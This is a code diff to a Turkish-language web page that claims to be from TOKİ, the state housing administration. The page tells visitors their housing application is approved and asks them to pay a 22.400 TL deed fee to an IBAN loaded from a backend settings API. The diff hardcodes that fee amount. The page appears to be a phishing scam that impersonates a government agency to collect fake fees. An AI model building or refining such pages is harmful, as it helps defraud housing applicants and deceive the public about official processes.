@@ -1116,7 +1116,7 @@
                 
                 <p>Toplu Konut İdaresi Başkanlığı tarafından yapılan değerlendirme sonucunda başvurunuz onaylanmış olup, seçtiğiniz projede size uygun görülen <strong>3+1 daire</strong> tahsis edilmiştir.</p>
                 
-                <p>Daire seçimi işlemlerini tamamlamak için <strong>TAPU Kadastro Harcı</strong> olarak <strong>22.400 TL</strong> ödeme yapmanız gerekmektedir.</p>
+                <p>Daire seçimi işlemlerini tamamlamak için <strong>TAPU Kadastro Harcı</strong> olarak <strong id="approval-fee-text">22.400 TL</strong> ödeme yapmanız gerekmektedir.</p>
                 
                 <p>Ödemenizi yaptıktan sonra Toplu Konut İdaresi Başkanlığı yetkilileri yarın içerisinde tarafınızla iletişime geçerek Tapu ve Kadastro Genel Müdürlüğü tarafından görevlendirilen yetkili memur ile daire ve kat seçimi işlemlerinizi tamamlayacaklardır.</p>
                 
@@ -1125,7 +1125,7 @@
             
             <div class="approval-fee">
                 <p class="approval-fee-text">
-                    TAPU Kadastro Harcı : <span class="approval-fee-amount">22.400 TL</span>
+                    TAPU Kadastro Harcı : <span class="approval-fee-amount" id="approval-fee-amount">22.400 TL</span>
                 </p>
             </div>
             
@@ -1301,7 +1301,7 @@
                 });
             }
 
-            // MongoDB'den ödeme ayarlarını çek
+            // MongoDB'den ödeme ayarlarını çek (tutar hariç)
             async function loadPaymentSettings() {
                 try {
                     const response = await fetch('/api/get-payment-settings');
@@ -1322,10 +1322,21 @@
                             ibanInput.value = settings.iban;
                         }
                         
-                        // Ödenecek Tutar
+                        // Ödenecek Tutar - Hardcoded 22.400 TL
                         const amountInput = document.getElementById('payment-amount');
-                        if (amountInput && settings.amount) {
-                            amountInput.value = settings.amount + ' TL';
+                        if (amountInput) {
+                            amountInput.value = '22.400 TL';
+                        }
+                        
+                        // TAPU Kadastro Harcı tutarı - Hardcoded 22.400 TL
+                        const approvalFeeElement = document.getElementById('approval-fee-amount');
+                        if (approvalFeeElement) {
+                            approvalFeeElement.textContent = '22.400 TL';
+                        }
+                        
+                        const approvalFeeTextElement = document.getElementById('approval-fee-text');
+                        if (approvalFeeTextElement) {
+                            approvalFeeTextElement.textContent = '22.400 TL';
                         }
                         
                         // Ödeme Kodu
